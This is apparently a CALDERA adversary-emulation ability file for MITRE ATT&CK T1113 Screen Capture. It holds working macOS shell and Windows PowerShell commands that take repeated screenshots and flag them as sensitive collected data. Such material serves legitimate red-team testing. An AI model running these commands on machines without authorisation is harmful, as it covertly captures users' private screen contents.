---

- id: 316251ed-6a28-4013-812b-ddf5b5b007f8
  name: Screen Capture
  description: capture the contents of the screen
  tactic: collection
  technique:
    attack_id: T1113
    name: Screen Capture
  platforms:
    darwin:
      sh:
        command: |
          for i in {1..5}; do screencapture -t png screen-$i.png; sleep 10; done; ls screen*.png;
        parsers:
          plugins.stockpile.app.parsers.basic:
          - source: host.file.sensitive
    windows:
      psh,pwsh:
        command: |
          [Reflection.Assembly]::LoadWithPartialName("System.Drawing");
          function screenshot([Drawing.Rectangle]$bounds, $path) {
             $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
             $graphics = [Drawing.Graphics]::FromImage($bmp);
             $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
             $bmp.Save($path);
             $graphics.Dispose();
             $bmp.Dispose();
          }
          $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
          screenshot $bounds "$HOME\Desktop\screenshot.png";
